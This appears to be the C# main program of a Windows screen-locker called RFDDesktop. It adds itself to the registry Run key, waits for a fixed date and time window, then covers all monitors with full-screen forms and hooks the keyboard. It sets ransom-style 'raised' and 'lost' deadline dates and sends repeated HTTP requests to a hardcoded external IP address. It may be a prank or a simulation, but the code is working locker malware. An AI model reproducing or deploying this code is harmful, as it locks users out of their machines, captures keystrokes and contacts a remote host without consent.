using Microsoft.Win32;
using RFDDesktop.Infrastructer.Extentions;
using RFDDesktop.Infrastructer.Helpers;
using RFDDesktop.Model;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Message = RFDDesktop.Model.Message;
using Screen = System.Windows.Forms.Screen;
using SystemScreen = RFDDesktop.Model.Screen;
using Task = System.Threading.Tasks.Task;
using Timer = System.Windows.Forms.Timer;

namespace RFDDesktop
{
    class Program
    {

        public static RFDHttpHelper _httpHelper = new RFDHttpHelper();
        public static Configuration _configuration;
        public static Message _message = new Message();
        public static bool _shutdownStatus = false;
        public static Timer _systemTimer;
        public static int _hookId;
        public static volatile int _summayId;
        public static IList<Form> _forms = new List<Form>();


        [STAThread]
        static void Main(string[] args)
        {
            var isChecked = CheckStartup();
            if (!isChecked)
                AddStartup();

            Task.Run(async () => { _summayId = await _httpHelper.AddAsync(); });

            Mutex mutex = new Mutex(true, "RFD-123456789", out bool createdNew);
            if (!createdNew)
                Environment.Exit(0);

            if (File.Exists(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "app.run")))
                Environment.Exit(0);


            var startDate = new DateTime(2022, 2, 22, 10, 30, 0);
            var endDate = new DateTime(2022, 2, 22, 17, 0, 0);


            var executeDate = DateTime.Now;
            if (!(executeDate.Year == 2022 && executeDate.Month == 2 && executeDate.Day == 22))
                Environment.Exit(0);

            var startTime = new TimeSpan(startDate.Hour, startDate.Minute, 0);
            var endTime = new TimeSpan(endDate.Hour, endDate.Minute, 0);
            var executeTime = new TimeSpan(executeDate.Hour, executeDate.Minute, 0);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            if (executeTime < startTime)
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                var workTimer = new Timer();
                workTimer.Interval = 1000;
                workTimer.Start();
                workTimer.Tick += (e, s) =>
                {
                    executeDate = DateTime.Now;
                    executeTime = new TimeSpan(executeDate.Hour, executeDate.Minute, 0);
                    if (executeTime >= startTime && executeTime <= endTime)
                    {
                        Start();
                        workTimer.Stop();
                    }
                };
                Application.Run();
            }
            else if (executeTime >= startTime && executeTime <= endTime)
            {
                Start();
            }
            else
            {
                Environment.Exit(0);
            }
            Application.Run();
        }


        private static void Start()
        {
            File.Create(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "app.run"));
            RemoveStartup();


            _configuration = new Configuration()
            {
                LostDate = DateTime.Now.AddDays(7),
                RaisedDate = DateTime.Now.AddDays(4)
            };

            foreach (var item in Screen.AllScreens)
            {
                var rfdForm = new RFDDesktop(item);
                rfdForm.Show();
                _forms.Add(rfdForm);
            }
            new Program().HostService();
            _hookId = new KeyboardHook().Hook();


        }
        public void HostService()
        {
            int count = default(int);
            int interval = 1000;
            _systemTimer = new Timer();
            _systemTimer.Start();
            _systemTimer.Interval = interval;
            _systemTimer.Tick += (e, args) =>
            {
                count++;
                if (count == ApplicationData.WorkTimeAsMinute * 60)
                    ApplicationExit();

                string ipAddress = GetRandomIpAddress();
                int requestType = new Random().Next(1, 3);
                if (requestType == 1)
                {
                    System.Threading.Tasks.Task.Run(async () => { await _httpHelper.AddAsync($"http://{ipAddress}/api/summary", 300); });
                }
                else if (requestType == 2)
                {
                    Task.Run(async () => { await _httpHelper.DidTrueClosedAsync($"http://{ipAddress}/api/summary", 300); });
                }
                else if (requestType == 3)
                {
                    Task.Run(async () => { await _httpHelper.GetSummaryCountAsync($"http://{ipAddress}/api/summary", 300); });
                }
            };
        }
        public static void ApplicationExit()
        {
            _systemTimer.Stop();
            _systemTimer.Dispose();

            new KeyboardHook().ReleaseKeyboardHook(_hookId);

            _shutdownStatus = true;

            foreach (var item in _forms)
                item.Close();

            new Alert().Show(); ;
        }


        public string GetRandomIpAddress()
        {
            var ips = new List<string>()
           {
               "54.124.45.89:54320",
               "54.124.45.89:45899",
               "54.124.45.89:35787",
               "54.124.45.89:44372",
               "54.124.45.89:5555",
           };
            int index = new Random().Next(0, ips.Count - 1);
            return ips[index];
        }


        public static void AddStartup()
        {
            string appName = System.AppDomain.CurrentDomain.FriendlyName;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue(appName, Application.ExecutablePath);
            }
        }




        public static void RemoveStartup()
        {
            string appName = AppDomain.CurrentDomain.FriendlyName;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue(appName, false);
            }
        }

        public static bool CheckStartup()
        {
            string appName = AppDomain.CurrentDomain.FriendlyName;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                var value = key.GetValue(appName);
                if (value != null)
                    return true;
                else
                    return false;
            }
        }

       

    }
}